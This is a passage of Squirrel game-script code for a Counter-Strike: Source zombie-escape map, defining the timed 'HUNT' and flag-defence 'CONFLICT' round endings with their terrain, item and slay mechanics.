					}},
				HUNT={			cancel_mapspawn=true,			movetp_clean=false,//v1_6:true
						zcap_tickrate = 0.50,
						zcap_hp_base = 150,
						zcap_hp_each_ct = 25,
						tpback_infect_immune_time = 5.00,
						slay_timer = 65.00,
						spawnkiller_delay = 7.00,
						round_ended = false,
					function TickZhpCap(){
						EntFire("manager","RunScriptCode"," ENDINGS.HUNT.TickZhpCap(); ",zcap_tickrate,null);
						::GetPlayerCount(); // updates the cached CT-count value if needed
						local hpcap = (0+::ENDINGS.HUNT.zcap_hp_base+(::ENDINGS.HUNT.zcap_hp_each_ct*::getplayercount_cache_ct));
						if(hpcap < 1)hpcap = 1;
						for(local h;h=Entities.FindByClassname(h,"player");)
						{
							if(h==null||!h.IsValid()||h.IsAlive()==false||h.GetTeam()!=2)continue;
							if(h.GetHealth()>hpcap)h.SetHealth(hpcap);
						}
						::TickZombieInvincibility_enabled = false;
					},function MassSlay(slay,msg="")
					{
						if(round_ended)return;
						if(slay)
						{
							round_ended=true;
							::ServerSay("say [HUNT ENDING] YOU RAN OUT OF TIME - YOU LOSE!",0.00,null);
							for(local h;h=Entities.FindByClassname(h,"player");)
							{
								if(h==null||!h.IsValid()||h.GetTeam()!=3)continue;
								EntFireByHandle(h,"SetDamageFilter","",0.00,null,null);
								EntFireByHandle(h,"SetHealth","-1",0.01,null,null);
								EntFireByHandle(h,"SetDamageFilter","",0.02,null,null);
								EntFireByHandle(h,"SetHealth","-1",0.05,null,null);
							}
							EntFire("manager","RunScriptCode"," EnableMassKillerAll(); ",0.50,null);
						}
						else ::ServerSay("say "+msg,0.00,null);
					},
					tplog = null,
					function Run2(){
						local mdata = ::MAPDATA[::manager.GetScriptScope().mapspawnindex-1];
						::ITEMS.rift.SpawnRift(mdata.end_pos+Vector(0,0,64),null,null,tplog,::ENDINGS.HUNT.tpback_infect_immune_time);
					},function Run3(){
						local mdata = ::MAPDATA[::manager.GetScriptScope().mapspawnindex-2];//v1_6:mapspawnindex-1
						::ITEMS.rift.SpawnRift(mdata.tp_pos+Vector(0,0,56),mdata.tp_pos,null,tplog,::ENDINGS.HUNT.tpback_infect_immune_time);
					},function Run(){
						if(::ENABLE_ENDING_MUSIC){
							for(local i=0;i<1;i++)
								::Sound("#music/luffaren_collective/valravn.mp3",Vector(),null,0,70.00,100,10);}
						::delay_check_enabled = false;
						::TickZombieInvincibility_enabled = false;
						::ServerSay("say [HUNT ENDING]",0.00,null);
						::ServerSay("say [HUNT ENDING]",0.01,null);
						::ServerSay("say [HUNT ENDING]",0.02,null);
						::ServerSay("say [HUNT ENDING] zombies have low HP - kill them all!",1.03,null);
						::ServerSay("say [HUNT ENDING] zombies have low HP - kill them all!",1.04,null);
						::ServerSay("say [HUNT ENDING] zombies have low HP - kill them all!",1.05,null);
						::ServerSay("say [HUNT ENDING] the human stage-end TP brings you back to the stage-start (with "+::ENDINGS.HUNT.tpback_infect_immune_time.tostring()+"s infect-immunity)",2.10,null);
						tplog = {tp1=null,tp2=null,tp_pos=null,function PlacedOutFullyKill(){}};
						EntFire("manager","RunScriptCode"," ENDINGS.HUNT.Run2(); ",2.00,null);
						EntFire("manager","RunScriptCode"," ENDINGS.HUNT.Run3(); ",2.30,null);
						local ii = (0.00+slay_timer-(slay_timer-5.00));
						if(ii>0.00 && ii < slay_timer)
						{
							::ServerSay("say [HUNT ENDING] YOU HAVE "+(0.00+slay_timer-5.00).tointeger().tostring()+"s TO KILL THE ZOMBIES",5.00,null);
							::ServerSay("say [HUNT ENDING] IF THE TIME RUNS OUT YOU LOSE",6.00,null);
						}
						ii=(0.00+slay_timer-60.00);if(ii>0.00)
							EntFire("manager","RunScriptCode"," ENDINGS.HUNT.MassSlay(false,\"[HUNT ENDING] YOU HAVE 60s LEFT TO KILL THE ZOMBIES\"); ",ii,null);
						ii=(0.00+slay_timer-30.00);if(ii>0.00)
							EntFire("manager","RunScriptCode"," ENDINGS.HUNT.MassSlay(false,\"[HUNT ENDING] YOU HAVE 30s LEFT TO KILL THE ZOMBIES\"); ",ii,null);
						ii=(0.00+slay_timer-10.00);if(ii>0.00)
							EntFire("manager","RunScriptCode"," ENDINGS.HUNT.MassSlay(false,\"[HUNT ENDING] YOU HAVE 10s LEFT TO KILL THE ZOMBIES\"); ",ii,null);
						ii=(0.00+slay_timer-5.00);if(ii>0.00)
							EntFire("manager","RunScriptCode"," ENDINGS.HUNT.MassSlay(false,\"[HUNT ENDING] YOU HAVE 5s LEFT TO KILL THE ZOMBIES\"); ",ii,null);
						ii=(0.00+slay_timer-4.00);if(ii>0.00)
							EntFire("manager","RunScriptCode"," ENDINGS.HUNT.MassSlay(false,\"[HUNT ENDING] YOU HAVE 4s LEFT TO KILL THE ZOMBIES\"); ",ii,null);
						ii=(0.00+slay_timer-3.00);if(ii>0.00)
							EntFire("manager","RunScriptCode"," ENDINGS.HUNT.MassSlay(false,\"[HUNT ENDING] YOU HAVE 3s LEFT TO KILL THE ZOMBIES\"); ",ii,null);
						ii=(0.00+slay_timer-2.00);if(ii>0.00)
							EntFire("manager","RunScriptCode"," ENDINGS.HUNT.MassSlay(false,\"[HUNT ENDING] YOU HAVE 2s LEFT TO KILL THE ZOMBIES\"); ",ii,null);
						ii=(0.00+slay_timer-1.00);if(ii>0.00)
							EntFire("manager","RunScriptCode"," ENDINGS.HUNT.MassSlay(false,\"[HUNT ENDING] YOU HAVE 1s LEFT TO KILL THE ZOMBIES\"); ",ii,null);
						EntFire("manager","RunScriptCode"," ENDINGS.HUNT.MassSlay(true); ",slay_timer,null);
						EntFire("manager","RunScriptCode"," EnableSpawnKiller(); ",::ENDINGS.HUNT.spawnkiller_delay,null);		//this also slays+kills flight-items
						::ServerSay("say [HUNT ENDING] RESPAWN IS DISABLED",::ENDINGS.HUNT.spawnkiller_delay+0.20,null);
						::ServerSay("say [HUNT ENDING] RESPAWN IS DISABLED",::ENDINGS.HUNT.spawnkiller_delay+0.21,null);
						::ServerSay("say [HUNT ENDING] RESPAWN IS DISABLED",::ENDINGS.HUNT.spawnkiller_delay+0.22,null);
						EntFire("manager","RunScriptCode"," ENDINGS.HUNT.TickZhpCap(); ",0.00,null);
						::ListenRoundEnd({function RoundEnd(winner,data){
								if(::round_already_won){printl("::ListenRoundEnd - round already won - ignoring");return;};
								printl("ListenRoundEnd: "+winner+" (3:CT, 2=T, 1=DRAW, null=BUGGED)");
								if(winner==3)
								{
									::ServerSay("say [HUNT ENDING] YOU WON!",0.00,null);
									printl("[HUNT ENDING] YOU WON!");
									::RoundWon();
								}
								else
									::ServerSay("say [HUNT ENDING] YOU LOST!",0.00,null);
								::ENDINGS.HUNT.round_ended = true;
							}});
					}},
				CONFLICT={	cancel_mapspawn=true,		movetp_clean=true,
						tp_delay = 13,
						prepare_time = 28.20,			//how long to wait before starting to timer countdown from 'battle_time'
						battle_time = 60.00,
						ztouchdmg_range = 45,			//Z's hurt H's within this range (each 'flag_tickrate')
						ztouchdmg_damage = 43,			//the damage to deal
						ztouchdmg_once = false,			//true: only deals damage once each tick, false: stacks damage if multiple Z's touching
						flag_tickrate = 0.30,			//the tickrate for various things (flag-capture, z-healthcap, z-touchdmg, status printout)
						flag_life_drain = 1.50,			//how much flag-hp (starting at 0.00, Z-win at 100.00) to drain each 'flag_tickrate' (for each zombie on flag)
						flag_life_drain_once = false,	//set to 'true' to only drain once per tick, 'false' makes it stack the drain for more zombies on the flag
						jump_force = 550,				//null:ignore		//__CSS__ og was 570, a bit too high for css causing falldmg
						jump_force_ct_only = false,
						base_width = 3,
						base_length = 3,
						arena_width = 18,
						arena_length = 27,
						zhp_base = 100,
						zhp_each_ct = 180,
						startbuffer_length = 5,
						item_flag_range = 700,			//__CSS__ webscript - og was 2000, 700 is more lenient for humans
						zplatform_height = 10.00,
						z_spawn_invincible_range = 700.00,	//how far the zombie-invincible range goes from the start-area (to prevent humans spawn-cheesing)
						process_full_delay = 16.50,
						process_full_startlimit = 10,	//this value must change if 'base_width' and/or 'base_length' is changed (cover base + zplatform at the start)
							//----------> it starts  by removing some tiles randomly:
							terrainclean_iterations = 8,				//__CSS__ og was 15, lowered for performance reasons
							terrainclean_scanpos_forward_min = 300,
							terrainclean_scanpos_forward_max = 4000,
							terrainclean_scanpos_side_min = 300,
							terrainclean_scanpos_side_max = 3000,
							terrainclean_scan_radius_min = 50,
							terrainclean_scan_radius_max = 400,
								//----------> then it +=/-= tile elevations:
								terrain_iterations = 12,					//__CSS__ og was 20, lowered for performance reasons
								terrain_iteration_startdelay = 3.00,
								terrain_iteration_rate = 0.07,			//__CSS__ og was 0.02, now slower for performance reasons
								terrain_scanpos_forward_min = 500,
								terrain_scanpos_forward_max = 4000,
								terrain_scanpos_side_min = 300,
								terrain_scanpos_side_max = 1000,
								terrain_scan_radius_min = 50,
								terrain_scan_radius_max = 800,
								terrain_scan_radius_zofs = 300,
								terrain_elevation_min = 40,
								terrain_elevation_max = 200,
								terrain_elevation_offset = 0,
									//----------> finally it spawns items:
									items_human = [
										//NEW v1_9:
											"heal_orb",
											"dragonslayer",
											"baguette",
											"peanutbutter",
											"planetcrystal",
											"planetcrystal",
											"planetcrystal",
											"planetcrystal",
										//OLD:
											//"heal_orb",
											//"claymore",
											//"claymore",
											//"storm_blade",
											//"dragonslayer",
											//"baguette",
											//"baguette",
											//"billnye",
											//"peanutbutter",
											//"planetcrystal",
											//"planetcrystal",
											//"planetcrystal",
											//"planetcrystal",
										],
									items_zombie = [
										
										//__CSS__ webscript - NEWEST (more lenient for humans)
											"puller",
											"pizzabaker",
											"destructo_hammer",
											"rift",
											"flight",
											"flight",
											"flight",
											"flight",
											"flight",
											"flight",
											"flight",
											"flight",
											"flight",
											"bomb_chuck",
											"stone",
											"stone",
											"stone",
											"stone",
											"stone",
											"stone",
										
										
										//NEW v1_9:
											//"puller",
											//"pizzabaker",
											//"destructo_hammer",
											//"rift",
											//"flight",
											//"flight",
											//"flight",
											//"flight",
											//"flight",
											//"bomb_chuck",
											//"bomb_chuck",
											//"bomb_chuck",
											//"bomb_chuck",
											//"bomb_chuck",
											//"bomb_chuck",
											//"stone",
											//"stone",
											//"stone",
											//"stone",
											//"stone",
											//"stone",
											//"stone",
											//"stone",
											//"stone",
											//"stone",
										//OLD:
											//"puller",
											//"pizzabaker",
											//"destructo_hammer",
											//"squid",
											//"impostor",
											//"rift",
											//"flight",
											//"bomb_chuck",
											//"bomb_chuck",
											//"bomb_chuck",
											//"stone",
											//"stone",
											//"stone",
											//"stone",
											//"stone",
											//"stone",
											//"stone",
											//"stone",
											//"stone",
											//"stone",
										],
					round_ended = false,
					timer_started = false,
					time = 60.00,
					life = 0.00,
					ended = false,
					winner = 0,
					tiles_human = [],
					tiles_zombie = [],
					function Run(){
						::delay_check_enabled = false;
						::ITEM_Z_HPLIMIT = 0;
						EntFire("manager","RunScriptCode","::ENDINGS.CONFLICT.timer_started = true;",prepare_time,null);
						time = (1.00+battle_time);
						::ServerSay("say [CONFLICT ENDING]",0.00,null);
						::ServerSay("say [CONFLICT ENDING]",0.01,null);
						::ServerSay("say [CONFLICT ENDING]",0.02,null);
						::ServerSay("say [CONFLICT ENDING] prepare for battle",1.03,null);
						::ServerSay("say [CONFLICT ENDING] gather items to defend your flag",2.04,null);
						::ServerSay("say [CONFLICT ENDING] if the zombies capture the flag you lose",3.05,null);
						::ServerSay("say [CONFLICT ENDING] survive for ~"+battle_time.tostring()+"s",4.06,null);
						::ListenRoundEnd({function RoundEnd(winner,data){
								if(::round_already_won){printl("::ListenRoundEnd - round already won - ignoring");return;};
								printl("ListenRoundEnd: "+winner+" (3:CT, 2=T, 1=DRAW, null=BUGGED)");
								if(winner==3)
								{
									::ServerSay("say [CONFLICT ENDING] YOU WON!",0.00,null);
									printl("[CONFLICT ENDING] YOU WON!");
									::RoundWon();
								}
								else
									::ServerSay("say [CONFLICT ENDING] YOU LOST!",0.00,null);
								::ENDINGS.CONFLICT.round_ended = true;
							}});
						if(::ENABLE_ENDING_MUSIC){::Sound("#music/luffaren_collective/like_you_imagined.mp3",Vector(),null,0,150.00,100,10);}
						local epos = Vector()+::MAPDATA[::manager.GetScriptScope().mapspawnindex-1].end_pos;
						local eposdir = Vector()+::MAPDATA[::manager.GetScriptScope().mapspawnindex-1].direction_next;
						local eposdirleft = Vector()+::AnglesToDir(::DirToAngles(eposdir)+Vector(0,90,0));
						local randyaw = [0,90,180,270];
						local man = ::manager.GetScriptScope();
						local spawnlist = [];
						for(local x=0;x<startbuffer_length;x++)
						{
							spawnlist.push({x=x,y=0.50,	z=0.00,yaw=null,index=5,targetname="block_"+(::manager.GetScriptScope().mapspawnindex-1).tostring()});
							spawnlist.push({x=x,y=-0.50,z=0.00,yaw=null,index=5,targetname="block_"+(::manager.GetScriptScope().mapspawnindex-1).tostring()});
						}
						foreach(s in spawnlist)
						{
							local model = ::TILEVARIANTS[::TYPES[s.index].name][::THEME].main[RandomInt(0,::TILEVARIANTS[::TYPES[s.index].name][::THEME].main.len()-1)];
							local spawndata = {pos=Vector(),yaw=randyaw[RandomInt(0,randyaw.len()-1)]};
							if(s.yaw!=null)spawndata.yaw = s.yaw;
							spawndata.pos = Vector()+epos+(eposdir*(man.GRID_SIZE/2))+
								(eposdir*(s.x*man.GRID_SIZE))+
								(eposdirleft*(s.y*man.GRID_SIZE))+
								Vector(0,0,s.z*man.ELEVATION);
							local sq = {index=s.index,spawnindex=99999,color=Vector(255,255,255),modelname=model,targetname="block_conflict_ending"};
							if("targetname" in s)sq.targetname <- s.targetname;
							::SpawnQueue.push(sq);
							::SpawnQueueSpawner.push(spawndata);
						}
						epos += (eposdir*(man.GRID_SIZE*(startbuffer_length-1)));
						local dirchecks = [];
						if(man.current_dir=="east")dirchecks = ["east","north","south"];
						else if(man.current_dir=="west")dirchecks = ["west","north","south"];
						else if(man.current_dir=="north")dirchecks = ["east","west","north"];
						else if(man.current_dir=="south")dirchecks = ["east","west","south"];
						dirchecks = ::ScrambleArray(dirchecks);
						foreach(dir in dirchecks)
						{
							local newpd = Vector();
							local newpdpos = Vector()+epos;
							if(dir=="east")newpd = Vector(1,0,0);
							else if(dir=="west")newpd = Vector(-1,0,0);
							else if(dir=="north")newpd = Vector(0,1,0);
							else if(dir=="south")newpd = Vector(0,-1,0);
							local allowed = false;
							if(dir=="east" && (newpdpos+(newpd*12000)).x < 15500)allowed=true;
							else if(dir=="west" && (newpdpos+(newpd*12000)).x > -15500)allowed=true;
							else if(dir=="north" && (newpdpos+(newpd*12000)).y < 15500)allowed=true;
							else if(dir=="south" && (newpdpos+(newpd*12000)).y > -15500)allowed=true;
							if(allowed)
							{
								man.current_dir = ""+dir;
								eposdir = Vector()+newpd;
								break;
							}
						}
						epos += (eposdir*(man.GRID_SIZE));
						eposdirleft = Vector()+::AnglesToDir(::DirToAngles(eposdir)+Vector(0,90,0));
						::manager.GetScriptScope().pos = Vector()+epos;
						::manager.GetScriptScope().posdir = Vector()+eposdir;
						EntFire("manager","RunScriptCode","::ENDINGS.CONFLICT.RunPost();",0.50,null);
					},function RunPost(){
						local epos = Vector()+::manager.GetScriptScope().pos;
						local eposdir = Vector()+::manager.GetScriptScope().posdir;
						local eposdirleft = Vector()+::AnglesToDir(::DirToAngles(eposdir)+Vector(0,90,0));
						local randyaw = [0,90,180,270];
						local man = ::manager.GetScriptScope();
						local tppos = Vector()+epos+(eposdir*(man.GRID_SIZE/2))+
								(eposdir*((base_length+arena_length)*man.GRID_SIZE))+
								Vector(0,0,(zplatform_height*man.ELEVATION)+8);
						::TPmovequeue.push(tppos);
						::TPmovequeue.push(::DirToAngles(eposdir)+Vector(0,180,0));
						EntFire("manager","RunScriptCode"," MoveTP(); ",tp_delay,null);
						EntFire("manager","RunScriptCode"," MoveTP(); ",tp_delay+0.05,null);
						local spawnlist = [//+x:forward, +y:left
							{x = base_length+arena_length,		y=0.00,		z=zplatform_height,		yaw=null,	index=25,	targetname="ending_conflict_ztpblock"},
						];
						local amount = 0;
						for(local x=0;x<base_length;x++)
						{
							for(local y= -(base_width/2);y<=(base_width/2);y++)
							{
								spawnlist.push({x=x,y=y,z=0.00,yaw=null,	index=40,	targetname="ending_conflict_humanground_block"});
							}
						}
						for(local x=0;x<arena_length;x++)
						{
							for(local y= -(arena_width/2);y<=(arena_width/2);y++)
							{
								spawnlist.push({x=(base_length+x),y=y,z=0.00,yaw=null,	index=20	targetname="block_conflict_ending"});
							}
						}
						local pqd = [];
						pqd.push({qrate=process_full_delay,function Run(){}});
						pqd.push({qrate=0.06,
							man = man,		//__CSS__thisified
							epos = epos,
							eposdir = eposdir,
							function Run(){
								local inviswall_length = (::ENDINGS.CONFLICT.arena_length*this.man.GRID_SIZE);
								local inviswall_width = ((::ENDINGS.CONFLICT.arena_width+1)*this.man.GRID_SIZE)/2;
								inviswall_length += 4;
								inviswall_width += 4;
								local inviswall_pos = Vector()+this.epos+(this.eposdir*(::ENDINGS.CONFLICT.base_length*man.GRID_SIZE));
								local inviswall_model = ::TILEVARIANTS["HOLD_1"][::THEME].main[RandomInt(0,::TILEVARIANTS["HOLD_1"][::THEME].main.len()-1)];
								//::manager.PrecacheModel(inviswall_model);
								//::Ent(inviswall_pos,::DirToAngles(this.eposdir),"prop_physics_override",{
								::Ent(inviswall_pos,::DirToAngles(this.eposdir),"prop_dynamic",{			//__CSS__  no more physics
										model = inviswall_model,
										spawnflags = 10,	//8:"motion disabled" + 2:"don't take physics damage"
										targetname = "ending_conflict_inviswall",
										DisableBoneFollowers = true,
									},{
									epos = this.epos,
									eposdir = this.eposdir,
									man = this.man,
									inviswall_length = inviswall_length,
									inviswall_width = inviswall_width,
									function RunPost(){
										local mins = self.GetBoundingMins();
										local maxs = self.GetBoundingMaxs();
										mins.x -= 10;mins.y -= 10;mins.z -= 10;
										maxs.x += 10;maxs.y += 10;maxs.z += 10;
										mins = "mins "+mins.x.tointeger().tostring()+" "+mins.y.tointeger().tostring()+" "+mins.z.tointeger().tostring();
										maxs = "maxs "+maxs.x.tointeger().tostring()+" "+maxs.y.tointeger().tostring()+" "+maxs.z.tointeger().tostring();
										::Ent(self.GetOrigin(),self.GetAngles(),"trigger_multiple",{
												spawnflags = 1,
												targetname = "ending_conflict_inviswall",
											},{
											mins = mins,
											maxs = maxs,
											epos = this.epos,
											eposdir = this.eposdir,
											man = this.man,
											function Touch(){
												local toucher = activator;	//__CSS__ activator may get reset, store toucher
												if(toucher.GetTeam()==3)
												{
													toucher.SetVelocity(Vector());
													toucher.SetOrigin(this.epos+(this.eposdir*200)+Vector(0,0,8));
												}
												else
												{
													toucher.SetVelocity(Vector());
													toucher.SetOrigin(Vector()+this.epos+(this.eposdir*(this.man.GRID_SIZE/2))+
														(this.eposdir*((::ENDINGS.CONFLICT.base_length+::ENDINGS.CONFLICT.arena_length)*this.man.GRID_SIZE))+
														Vector(0,0,(::ENDINGS.CONFLICT.zplatform_height*this.man.ELEVATION)+8));
												}
											},function Run(){
												EntFireByHandle(self,"AddOutput",mins,0.00,null,null);
												EntFireByHandle(self,"AddOutput",maxs,0.00,null,null);
												EntFireByHandle(self,"RunScriptCode","self.SetSolid(3);",0.00,null,null);
												EntFireByHandle(self,"RunScriptCode","self.SetCollisionGroup(10);",0.00,null,null);
												EntFireByHandle(self,"AddOutput","OnStartTouch !self:RunScriptCode:Touch();:0:-1",0.00,null,null);
												EntFireByHandle(self,"Enable","",0.02,null,null);
													//EntFireByHandle(self,"RunScriptCode",
													//" DebugDrawBoxAngles(self.GetOrigin(),self.GetBoundingMins()"+
													//",self.GetBoundingMaxs(),self.GetAngles(),0,0,0,200,10.00); ",0.05,null,null);
											}});
										EntFireByHandle(self,"Kill","",0.05,null,null);	//lazyfix: honestly the trigger seems to suffice, just don't bother with solidity
									},function Run(){
										EntFireByHandle(self,"RunScriptCode","RunPost();",0.10,null,null);
										EntFireByHandle(self,"AddOutput","mins -2 -"+inviswall_width.tostring()+" -2000",0.00,null,null);
										EntFireByHandle(self,"AddOutput","maxs "+inviswall_length.tostring()+" "+inviswall_width.tostring()+" 5000",0.00,null,null);
										EntFireByHandle(self,"RunScriptCode","self.SetSolid(0);",0.00,null,null);			//lazyfix, don't even run it as solid
										//EntFireByHandle(self,"RunScriptCode","self.SetSolid(3);",0.05,null,null);
										EntFireByHandle(self,"AddOutput","rendermode 1",0.00,null,null);
										EntFireByHandle(self,"AddOutput","renderamt 0",0.00,null,null);
											//EntFireByHandle(self,"RunScriptCode",
											//" DebugDrawBoxAngles(self.GetOrigin(),self.GetBoundingMins()"+
											//",self.GetBoundingMaxs(),self.GetAngles(),0,0,0,200,10.00); ",0.05,null,null);
									}});
						}});
						foreach(s in spawnlist)
						{
							local model = ::TILEVARIANTS[::TYPES[s.index].name][::THEME].main[RandomInt(0,::TILEVARIANTS[::TYPES[s.index].name][::THEME].main.len()-1)];
							local spawndata = {pos=Vector(),yaw=randyaw[RandomInt(0,randyaw.len()-1)]};
							if(s.yaw!=null)spawndata.yaw = s.yaw;
							spawndata.pos = Vector()+epos+(eposdir*(man.GRID_SIZE/2))+
								(eposdir*(s.x*man.GRID_SIZE))+
								(eposdirleft*(s.y*man.GRID_SIZE))+
								Vector(0,0,s.z*man.ELEVATION);
							local sq = {index=s.index,spawnindex=99999,color=Vector(255,255,255),modelname=model,targetname="block_conflict_ending"};
							if("targetname" in s)sq.targetname <- s.targetname;
							amount++;
							if(amount>process_full_startlimit)
								pqd.push({
									sq = sq,
									spawndata = spawndata,
									function Run(){
										::SpawnQueue.push(this.sq);
										::SpawnQueueSpawner.push(spawndata);
									}});
							else
							{
								::SpawnQueue.push(sq);
								::SpawnQueueSpawner.push(spawndata);
							}
						}
						pqd.push({qrate=::ENDINGS.CONFLICT.terrain_iteration_startdelay,function Run(){}});
						for(local i=0;i<::ENDINGS.CONFLICT.terrainclean_iterations;i++)
							pqd.push({qrate=::ENDINGS.CONFLICT.terrain_iteration_rate,
								epos = epos,
								eposdir = eposdir,
								eposdirleft = eposdirleft,
								function Run(){
									local edside = Vector()+eposdirleft;
									if(RandomInt(0,1)==0)edside *= -1;
									local scan_pos = Vector()+epos+
										(eposdir*RandomFloat(::ENDINGS.CONFLICT.terrainclean_scanpos_forward_min,::ENDINGS.CONFLICT.terrainclean_scanpos_forward_max))+
										(edside*RandomFloat(::ENDINGS.CONFLICT.terrainclean_scanpos_side_min,::ENDINGS.CONFLICT.terrainclean_scanpos_side_max));
									local scan_radius = RandomFloat(::ENDINGS.CONFLICT.terrainclean_scan_radius_min,::ENDINGS.CONFLICT.terrainclean_scan_radius_max);
									local scan_radius_zofs = ::ENDINGS.CONFLICT.terrain_scan_radius_zofs;
									local scan_elevation = RandomFloat(::ENDINGS.CONFLICT.terrain_elevation_min,::ENDINGS.CONFLICT.terrain_elevation_max);
									local scan_elevation_offset = 0+::ENDINGS.CONFLICT.terrain_elevation_offset;
									if(RandomInt(0,1)==0)scan_elevation *= -1;
									for(local h;h=Entities.FindByNameWithin(h,"block_conflict_ending",scan_pos,scan_radius);)
											{EntFireByHandle(h,"Kill","",0.00,null,null);}
								}});
						for(local i=0;i<::ENDINGS.CONFLICT.terrain_iterations;i++)
							pqd.push({qrate=::ENDINGS.CONFLICT.terrain_iteration_rate,
								epos = epos,
								eposdir = eposdir,
								eposdirleft = eposdirleft,
								function Run(){
									local edside = Vector()+eposdirleft;
									if(RandomInt(0,1)==0)edside *= -1;
									local scan_pos = Vector()+epos+
										(eposdir*RandomFloat(::ENDINGS.CONFLICT.terrain_scanpos_forward_min,::ENDINGS.CONFLICT.terrain_scanpos_forward_max))+
										(edside*RandomFloat(::ENDINGS.CONFLICT.terrain_scanpos_side_min,::ENDINGS.CONFLICT.terrain_scanpos_side_max));
									local scan_radius = RandomFloat(::ENDINGS.CONFLICT.terrain_scan_radius_min,::ENDINGS.CONFLICT.terrain_scan_radius_max);
									local scan_radius_zofs = ::ENDINGS.CONFLICT.terrain_scan_radius_zofs;
									local scan_elevation = RandomFloat(::ENDINGS.CONFLICT.terrain_elevation_min,::ENDINGS.CONFLICT.terrain_elevation_max);
									local scan_elevation_offset = 0+::ENDINGS.CONFLICT.terrain_elevation_offset;
									if(RandomInt(0,1)==0)scan_elevation *= -1;
									for(local h;h=Entities.FindByNameWithin(h,"block_conflict_ending",
										scan_pos+Vector(0,0,RandomFloat(-scan_radius_zofs,scan_radius_zofs)),scan_radius);)
											{h.SetOrigin(h.GetOrigin()+Vector(0,0,scan_elevation+RandomFloat(-scan_elevation_offset,scan_elevation_offset)));}
								}});
						pqd.push({qrate=0.05,function Run(){
							EntFire("ending_conflict_inviswall","Kill","",0.00,null);
							::JUMP_VELOCITY = 0.00+::ENDINGS.CONFLICT.jump_force;
							::JUMP_VELOCITY_CTONLY = false;
							::JUMP_VELOCITY_CROUCHO = true;
						}});
						pqd.push({qrate=0.05,
							epos = epos,
							function Run(){
								local scan_pos = Vector()+epos;
								for(local h;h=Entities.FindByNameWithin(h,"block_conflict_ending",scan_pos,::ENDINGS.CONFLICT.item_flag_range);)
									{::ENDINGS.CONFLICT.tiles_human.push(h.GetOrigin());}
							}});
						pqd.push({qrate=0.05,
							epos = epos,
							eposdir = eposdir,
							function Run(){
								local scan_pos = Vector()+epos+(eposdir*((::ENDINGS.CONFLICT.base_length+::ENDINGS.CONFLICT.arena_length)*
									::manager.GetScriptScope().GRID_SIZE));
								for(local h;h=Entities.FindByNameWithin(h,"block_conflict_ending",scan_pos,::ENDINGS.CONFLICT.item_flag_range);)
									{::ENDINGS.CONFLICT.tiles_zombie.push(h.GetOrigin());}
							}});
						pqd.push({qrate=0.05,
							function Run(){
								if(::ENDINGS.CONFLICT.tiles_human.len() <= 0)
								{
									::ServerSay("say [CONFLICT ENDING] NO FLAG TILE FOUND - YOU WON BY DEFAULT!",0.00,null);
									::ServerSay("say [CONFLICT ENDING] NO FLAG TILE FOUND - YOU WON BY DEFAULT!",0.01,null);
									::ServerSay("say [CONFLICT ENDING] NO FLAG TILE FOUND - YOU WON BY DEFAULT!",0.02,null);
									::ServerSay("say [CONFLICT ENDING] NO FLAG TILE FOUND - YOU WON BY DEFAULT!",0.03,null);
									::ServerSay("say [CONFLICT ENDING] NO FLAG TILE FOUND - YOU WON BY DEFAULT!",0.04,null);
									printl("[CONFLICT ENDING] NO FLAG TILE FOUND - YOU WON BY DEFAULT!");
									::RoundWon(false);
									EntFire("manager","RunScriptCode"," EnableSpawnKiller(); ",0.10,null);
									EntFire("manager","RunScriptCode"," EnableMassKillerAll(); ",0.15,null);
									return;
								}
								local tile_idx = RandomInt(0,::ENDINGS.CONFLICT.tiles_human.len()-1);
								local tile_pos = ::ENDINGS.CONFLICT.tiles_human[tile_idx];
								::ENDINGS.CONFLICT.tiles_human.remove(tile_idx);
								local h=Entities.FindByNameWithin(null,"block_conflict_ending",tile_pos,16);
								if(h==null||!h.IsValid()){}else EntFireByHandle(h,"AddOutput","targetname ending_conflict_flagblock",0.00,null,null);
								//::manager.PrecacheModel("models/props/de_cbble/cobble_flagpole.mdl");
								::manager.PrecacheModel("models/props_wasteland/dockpole01a.mdl");
								::Ent(tile_pos+Vector(0,0,-10),Vector(0,RandomFloat(0,360),0),"prop_dynamic",{
										//model = "models/props/de_cbble/cobble_flagpole.mdl",			//__CSS__ <og - doesn't exist in CSS
										model = "models/props_wasteland/dockpole01a.mdl",
										targetname = "ending_conflict_flag",
										rendermode = 3,
										modelscale = 1.50,
										glowenabled = 1,
										glowdist = 30000,
										glowstyle = 1,
										glowcolor = "50 200 255",
										rendercolor = "20 100 255",
									},{
									glow = null,
									function Tick(){
										if(::ENDINGS.CONFLICT.ended)
										{
											local team_to_slay = 3;
											if(::ENDINGS.CONFLICT.winner==3)	//CT win
												team_to_slay = 2;
											for(local h;h=Entities.FindByClassname(h,"player");)
											{
												if(h==null||!h.IsValid()||h.GetTeam()!=team_to_slay)continue;
														//OLD
												//EntFireByHandle(h,"SetDamageFilter","",0.00,null,null);
												//EntFireByHandle(h,"SetHealth","-1",0.01,null,null);
												//EntFireByHandle(h,"SetDamageFilter","",0.02,null,null);
												//EntFireByHandle(h,"SetHealth","-1",0.05,null,null);
													//NEW IN v1_9 - safety-backup/tick to ensure a slay
												::HurtPlayer(h,true);
											}
											EntFireByHandle(self,"AddOutput","glowenabled 0",0.00,null,null);
											EntFireByHandle(self,"AddOutput","glowdist 0",0.00,null,null);
											EntFireByHandle(self,"Kill","",0.20,null,null);
											EntFire("manager","RunScriptCode"," EnableSpawnKiller(); ",0.20,null);
											EntFire("manager","RunScriptCode"," EnableMassKillerAll(); ",15.00,null);		//timeout slay
											return;
										}
										EntFireByHandle(self,"RunScriptCode","Tick();",::ENDINGS.CONFLICT.flag_tickrate,null,null);
										::manager.GetScriptScope().TickZombieInvincibility_range = ::ENDINGS.CONFLICT.z_spawn_invincible_range;
										local hit = false;
										for(local h;h=Entities.FindByClassnameWithin(h,"player",self.GetOrigin()+Vector(0,0,40),40);)
										{
											if(h==null||!h.IsValid()||h.GetTeam()!=2||h.IsAlive()==false)continue;
											hit = true;
											::ENDINGS.CONFLICT.life += ::ENDINGS.CONFLICT.flag_life_drain;
											if(::ENDINGS.CONFLICT.flag_life_drain_once)
												break;
										}
										local state = "";
										if(hit)
										{
											EntFireByHandle(self,"AddOutput","rendercolor 255 0 0",0.00,null,null);
											EntFireByHandle(self,"AddOutput","glowcolor 255 0 0",0.00,null,null);
											EntFireByHandle(glow,"AddOutput","rendercolor 255 0 0",0.00,null,null);
											state = "\n[FLAG IS UNDER ATTACK]";
											local pitch = (70+::ENDINGS.CONFLICT.life);
											::Sound("*luffaren/click1.mp3",self.GetOrigin()+Vector(0,0,100),null,300000,0.50,pitch,10);
										}
										else
										{
